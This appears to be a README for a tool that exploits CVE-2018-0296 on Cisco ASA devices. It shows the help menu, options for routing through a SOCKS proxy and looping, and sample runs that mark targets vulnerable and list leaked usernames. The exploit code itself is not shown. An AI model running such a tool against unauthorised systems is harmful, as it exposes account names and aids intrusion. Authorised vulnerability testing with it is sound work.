# CVE-2018-0296
Test CVE-2018-0296 and extract usernames from Cisco ASA.  
  
Refer to https://sekurak.pl/opis-bledu-cve-2018-0296-ominiecie-uwierzytelnienia-w-webinterfejsie-cisco-asa/ for more technical details.  
  
#Help Menu
```
$ ./CVE-2018-0296  -h
Options:

  -h, --help   display help information
  -u, --url    Url of target device
  -i           IP of Socks Proxy
  -p           Port of Socks Proxy
  -t, --time   Number of seconds to sleep between loop
      --loop   Loop mode
```
  
#Usage Guide  
```
$ ./CVE-2018-0296 -u https://x.x.x.x:443
[*] Checking: https://x.x.x.x:443
[+] https://x.x.x.x:443 [Cisco VPN]
[+] https://x.x.x.x:443 [Vulnerable]
[*] Usernames found
testuser1

$ ./CVE-2018-0296 -u https://www.yahoo.com:443
[*] Checking: https://www.yahoo.com
[+] https://www.yahoo.com [NOT Cisco VPN]

$ ./CVE-2018-0296 -u https://x.x.x.x:443
[*] Checking: https://x.x.x.x
[+] https://x.x.x.x [Cisco VPN]
[+] https://x.x.x.x [Vulnerable]
[*] No usernames found
  
$ ./CVE-2018-0296  -i 127.0.0.1 -p 10000 --loop 10 -u https://x.x.x.x:443
[*] Checking: https://x.x.x.x:443
[+] https://x.x.x.x:443 [Cisco VPN]
[+] https://x.x.x.x:443 [Vulnerable]
[*] Usernames found
testuser1
```
